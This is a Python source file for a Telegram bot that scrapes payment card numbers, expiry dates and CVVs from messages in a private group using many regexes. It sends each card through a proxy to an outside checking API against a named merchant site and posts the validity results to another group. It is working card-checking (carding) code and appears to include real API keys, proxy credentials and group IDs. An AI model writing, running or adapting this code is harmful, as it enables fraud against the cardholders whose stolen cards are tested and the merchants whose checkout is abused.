# advanced_fast_card_bot.py
import re
import aiohttp
import asyncio
import random
import logging
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from typing import List, Tuple, Set, Optional

# ---------------- CONFIG ----------------
logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger("fast-card-bot")

# Replace these with your real details
api_id = 17455551
api_hash = "abde39d2fad230528b2695a14102e76a"
SESSION_STRING = "1BVtsO...YOUR_SESSION...yf4="

PRIVATE_GROUP_ID = -1002682944548   # group to listen to
TARGET_GROUP_ID = -1002968335063    # group to send results to
ADMIN_ID = 8493360284

API_URL = "https://autosh.arpitchk.shop/puto.php"  # your API endpoint
SITE = "https://jasonwubeauty.com"
PROXIES = [
    "45.41.172.51:5794:juftilus:atasaxde44jl",
    # add more proxy strings if available; API seems to accept proxy as param
]

# Concurrency requested by you
NUM_CONCURRENT = 5

# ---------------- TELETHON CLIENT ----------------
client = TelegramClient(StringSession(SESSION_STRING), api_id, api_hash)
session: Optional[aiohttp.ClientSession] = None
dropping_enabled = True  # default ON; change as needed

# ---------------- SEMAPHORE ----------------
semaphore = asyncio.Semaphore(NUM_CONCURRENT)

# ---------------- ADVANCED REGEXES (many formats) ----------------
# We'll try several realistic card layouts. Each pattern captures 4 groups:
# (cc group), (mm), (yy or yyyy), (cvv)
# Patterns support different separators (space, dash, dot, slash, pipe),
# grouped 4-4-4-4, 4-6-5, contiguous, with labels like "cc:", "card:", "CVV:" etc.
REGEX_PATTERNS = [
    # contiguous with separators like | or /
    re.compile(r"(?P<cc>\d{13,19})\s*[\|/:-]?\s*(?P<mm>\d{2})\s*[\|/:-]?\s*(?P<yy>\d{2,4})\s*[\|/:-]?\s*(?P<cvv>\d{3,4})"),
    # grouped 4 4 4 3/4 (typical 16)
    re.compile(r"(?P<cc>(?:\d{4}[\s\-\.\|]){3}\d{4})\s*(?:\D{0,6})\s*(?P<mm>\d{2})\s*[\|/:-]?\s*(?P<yy>\d{2,4})\s*[\|/:-]?\s*(?P<cvv>\d{3,4})"),
    # grouped 4-6-5
    re.compile(r"(?P<cc>(?:\d{4}[\s\-\.\|]){2}\d{6}[\s\-\.\|]?\d{3,4})\s*(?P<mm>\d{2})\s*[/\|:-]?\s*(?P<yy>\d{2,4})\s*[/\|:-]?\s*(?P<cvv>\d{3,4})"),
    # cc: 4242 4242 4242 4242 mm/yy cvv:
    re.compile(r"(?:cc|card|cardnum|card number|number)\s*[:\-]?\s*(?P<cc>(?:\d{4}[\s\-\.\|]){3}\d{4})(?:\D{0,6})(?P<mm>\d{2})[\/\-\|](?P<yy>\d{2,4})\D{0,6}(?P<cvv>\d{3,4})", re.I),
    # inline: 4242424242424242 12 23 123
    re.compile(r"(?P<cc>\d{13,19})\s+(?P<mm>\d{2})\s+(?P<yy>\d{2,4})\s+(?P<cvv>\d{3,4})"),
    # with labels and different separators
    re.compile(r"(?P<cc>\d{13,19})\D{1,4}(?P<mm>\d{2})\D{1,4}(?P<yy>\d{2,4})\D{1,4}(?P<cvv>\d{3,4})"),
    # dotted groups: 4242.4242.4242.4242
    re.compile(r"(?P<cc>(?:\d{4}\.){3}\d{4})\D{0,6}(?P<mm>\d{2})[\/\-\|]?(?P<yy>\d{2,4})\D{0,6}(?P<cvv>\d{3,4})"),
    # dash groups: 4242-4242-4242-4242
    re.compile(r"(?P<cc>(?:\d{4}\-){3}\d{4})\D{0,6}(?P<mm>\d{2})[\/\-\|]?(?P<yy>\d{2,4})\D{0,6}(?P<cvv>\d{3,4})"),
    # pipe groups: 4242|4242|4242|4242
    re.compile(r"(?P<cc>(?:\d{4}\|){3}\d{4})\D{0,6}(?P<mm>\d{2})\D{0,6}(?P<yy>\d{2,4})\D{0,6}(?P<cvv>\d{3,4})"),
    # 15-digit Amex like 3782 822463 10005 05 23 1234
    re.compile(r"(?P<cc>\d{15})\D{0,6}(?P<mm>\d{2})[\/\-\|]?(?P<yy>\d{2,4})\D{0,6}(?P<cvv>\d{3,4})"),
    # spaced groups of 4 or mixed spacing
    re.compile(r"(?P<cc>(?:\d{2,4}[\s\-\.\|/]){3,6}\d{2,4})\D{0,6}(?P<mm>\d{2})\D{0,6}(?P<yy>\d{2,4})\D{0,6}(?P<cvv>\d{3,4})"),
    # CPF-like messy but possible: "4242 42424242 12/25 123"
    re.compile(r"(?P<cc>\d{13,19})\s*\d*\s*(?P<mm>\d{2})[\/\-\|]?(?P<yy>\d{2,4})\s*(?P<cvv>\d{3,4})"),
    # labelled CVV at end: 4242 4242 4242 4242 cvv:123 mm/yy:12/24
    re.compile(r"(?P<cc>(?:\d{4}[\s\-\.\|/]){3}\d{4}).{0,40}?cvv[:\s\-]*?(?P<cvv>\d{3,4}).{0,40}?(?P<mm>\d{2})[\/\-\|]?(?P<yy>\d{2,4})", re.I),
    # 4 groups but mm/yy may appear before or after
    re.compile(r"(?P<cc>(?:\d{4}[\s\-\.\|/]){3}\d{4})(?:.*?)(?P<mm>\d{2})\D{0,4}(?P<yy>\d{2,4}).{0,40}?(?P<cvv>\d{3,4})", re.I),
    # separated by JSON-ish like {"cc":"4242 4242 4242 4242","mm":"12","yy":"25","cvv":"123"}
    re.compile(r"\"?cc\"?\s*[:=]\s*\"?(?P<cc>[\d\s\-\.\|]{13,25})\"?.*?\"?mm\"?\s*[:=]\s*\"?(?P<mm>\d{2})\"?.*?\"?yy\"?\s*[:=]\s*\"?(?P<yy>\d{2,4})\"?.*?\"?cvv\"?\s*[:=]\s*\"?(?P<cvv>\d{3,4})\"?", re.I),
    # slack-style: CC: `4242424242424242` MM: `12` YY: `25` CVV: `123`
    re.compile(r"cc[:\s`]*(`?)(?P<cc>\d{13,19})\1.*?mm[:\s`]*(?P<mm>\d{2}).*?yy[:\s`]*(?P<yy>\d{2,4}).*?cvv[:\s`]*(?P<cvv>\d{3,4})", re.I),
    # plain 16 digits anywhere followed soon after by mm yy cvv
    re.compile(r"(?P<cc>\d{16}).{0,20}?(?P<mm>\d{2})[\/\-\|]?(?P<yy>\d{2,4}).{0,20}?(?P<cvv>\d{3,4})"),
    # detect 13..19 contiguous then CVV label separated by anything
    re.compile(r"(?P<cc>\d{13,19}).{0,30}?cvv[:\s\-]?(?P<cvv>\d{3,4}).{0,10}?exp[:\s\-]?(?P<mm>\d{2})[\/\-]?(?P<yy>\d{2,4})", re.I),
    # mm/yy as MMYY directly without slash, e.g., "1225"
    re.compile(r"(?P<cc>\d{13,19})\D{0,6}(?P<mm>\d{2})(?P<yy>\d{2})(?:\D{0,6})(?P<cvv>\d{3,4})"),
    # patterns with parentheses or <> around numbers
    re.compile(r"(?P<cc>[\(<]?\d{13,19}[\)>]?).{0,10}(?P<mm>\d{2})[\/\-\|]?(?P<yy>\d{2,4}).{0,10}(?P<cvv>\d{3,4})"),
    # fallback broad pattern: look for 4 numeric tokens in the message where token lengths are plausible
    re.compile(r"(?P<cc>(?:\d{4,6}[\s\-\.\|/]){2,4}\d{2,6})\D{0,10}(?P<mm>\d{2})\D{0,4}(?P<yy>\d{2,4})\D{0,10}(?P<cvv>\d{3,4})"),
    # pay attention to 2-2-4 groups like "4242 12 25 123" (cc may be shortened)
    re.compile(r"(?P<cc>\d{12,19})\s+(?P<mm>\d{2})\s+(?P<yy>\d{2,4})\s+(?P<cvv>\d{3,4})"),
    # labels split across lines: Card\n4242-4242-4242-4242\nExp 12/25 CVV 123
    re.compile(r"(?s)(?:card|cc|card number)[:\s]*\n?(?P<cc>(?:\d{4}[\s\-\.\|/]){3}\d{4}).*?exp[:\s]*?(?P<mm>\d{2})[\/\-\|]?(?P<yy>\d{2,4}).*?cvv[:\s]*?(?P<cvv>\d{3,4})", re.I),
]

# Normalize separators for cc groups extracted (remove spaces/dashes/dots/pipes)
_SEP_CLEAN = re.compile(r"[\s\-\.\|/]")

# ---------------- HELPERS ----------------
def normalize_year(yy: str) -> str:
    """Return 2-digit year (e.g., '2025'->'25', '25'->'25')."""
    yy = yy.strip()
    if len(yy) == 4:
        return yy[-2:]
    return yy.zfill(2)

def normalize_cc(cc_raw: str) -> str:
    """Strip separators and keep continuous digits (13..19)."""
    cleaned = _SEP_CLEAN.sub("", cc_raw)
    # keep only digits
    cleaned = re.sub(r"\D", "", cleaned)
    return cleaned

def build_card_token(cc: str, mm: str, yy: str, cvv: str) -> str:
    """Return standardized token cc|mm|yy|cvv with normalized year and cc."""
    cc_n = normalize_cc(cc)
    mm_n = mm.zfill(2)
    yy_n = normalize_year(yy)
    cvv_n = re.sub(r"\D", "", cvv)
    return f"{cc_n}|{mm_n}|{yy_n}|{cvv_n}"

def extract_cards_from_text(text: str) -> List[str]:
    """Try all patterns and return deduplicated list of normalized card tokens."""
    found: List[str] = []
    seen: Set[str] = set()
    if not text:
        return []
    for pat in REGEX_PATTERNS:
        for m in pat.finditer(text):
            try:
                groups = m.groupdict()
            except Exception:
                groups = {}
            # group names may vary; try multiple ways
            cc = groups.get("cc") or (m.group(1) if m.groups() else None)
            mm = groups.get("mm") or (m.group(2) if len(m.groups()) >= 2 else None)
            yy = groups.get("yy") or (m.group(3) if len(m.groups()) >= 3 else None)
            cvv = groups.get("cvv") or (m.group(4) if len(m.groups()) >= 4 else None)

            if not all([cc, mm, yy, cvv]):
                # try to salvage with positional groups if present
                g = m.groups()
                if len(g) >= 4:
                    cc, mm, yy, cvv = g[0], g[1], g[2], g[3]
                else:
                    continue

            cc_n = normalize_cc(cc)
            if not (13 <= len(cc_n) <= 19):
                continue
            # basic sanity: month 01-12
            try:
                mm_i = int(mm)
                if not (1 <= mm_i <= 12):
                    continue
            except Exception:
                continue
            card_token = build_card_token(cc, mm, yy, cvv)
            if card_token not in seen:
                seen.add(card_token)
                found.append(card_token)
    return found

# ---------------- API CALL ----------------
async def call_api_for_card(card_token: str, retries: int = 2, timeout: int = 12) -> dict:
    """
    Calls the external API. Uses one of the PROXIES as query param (non-HTTP proxy).
    Returns parsed JSON dict when possible, else returns dict with Response key.
    """
    proxy_choice = random.choice(PROXIES) if PROXIES else ""
    params = {"site": SITE, "cc": card_token, "proxy": proxy_choice}
    backoff = 1.0
    for attempt in range(retries + 1):
        try:
            async with session.get(API_URL, params=params, timeout=timeout) as resp:
                text = await resp.text()
                # try json
                try:
                    return await resp.json()
                except Exception:
                    # fallback: crude parse
                    return {"Response": text.strip()[:200], "raw": text}
        except asyncio.CancelledError:
            raise
        except Exception as e:
            logger.debug("API call failed (attempt %d/%d): %s", attempt + 1, retries + 1, e)
            if attempt < retries:
                await asyncio.sleep(backoff)
                backoff *= 2
            else:
                return {"Response": f"API Error: {e}"}
    return {"Response": "Unknown error"}

# ---------------- PROCESSING ----------------
async def process_card_token(card_token: str, source_message_id: int, source_chat_id: int):
    """
    Sends the card to API (concurrently limited by semaphore).
    Posts result back to TARGET_GROUP_ID (when enabled).
    """
    async with semaphore:
        logger.info("Processing card %s", card_token)
        result = await call_api_for_card(card_token)
        response = result.get("Response", result.get("response", "No response"))
        price = result.get("Price", "-")
        gateway = result.get("Gateway", "-")
        resp_text = f"CC: `{card_token}` | Resp: {response} | Price: {price} | Gateway: {gateway}"
        logger.info("API result for %s -> %s", card_token, response)

        if dropping_enabled:
            try:
                # forward to target group as plain text (not MarkdownV2 to keep things simple)
                await client.send_message(TARGET_GROUP_ID, resp_text)
            except Exception as e:
                logger.warning("Failed to send result to target group: %s", e)

# ---------------- EVENT LISTENERS ----------------
@client.on(events.NewMessage(chats=PRIVATE_GROUP_ID))
async def on_new_message(event):
    """
    Primary fast listener. Extracts card tokens and schedules API tasks immediately.
    """
    # quick exit on empty
    text = event.raw_text or ""
    if not text.strip():
        return

    # Extract cards (fast, precompiled regexes)
    card_tokens = extract_cards_from_text(text)
    if not card_tokens:
        return

    # For traceability, log message and all found cards
    logger.info("Found %d card(s) in message %s: %s", len(card_tokens), event.id, card_tokens)

    # schedule tasks immediately (but concurrency controlled by semaphore)
    for token in card_tokens:
        asyncio.create_task(process_card_token(token, event.id, event.chat_id))

# Admin commands (in the same source group or to bot account)
@client.on(events.NewMessage(from_users=ADMIN_ID))
async def admin_listener(event):
    """
    Accepts admin commands anywhere from ADMIN_ID:
    /drop -> enable, /stop -> disable, /status -> show status
    """
    txt = (event.raw_text or "").strip().lower()
    global dropping_enabled
    if txt == "/drop":
        dropping_enabled = True
        await event.reply("✅ Dropping enabled.")
        logger.info("Dropping enabled by admin.")
    elif txt == "/stop":
        dropping_enabled = False
        await event.reply("⏹ Dropping disabled.")
        logger.info("Dropping disabled by admin.")
    elif txt == "/status":
        await event.reply(f"✅ Dropping: {dropping_enabled}\nConcurrency: {NUM_CONCURRENT}")
    # else ignore

# ---------------- START / STOP ----------------
async def main():
    global session
    session = aiohttp.ClientSession()
    await client.start()
    logger.info("Telethon client started. Listening for cards...")
    try:
        await client.run_until_disconnected()
    finally:
        await session.close()
        logger.info("Shutdown: aiohttp session closed.")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("Stopped by user")
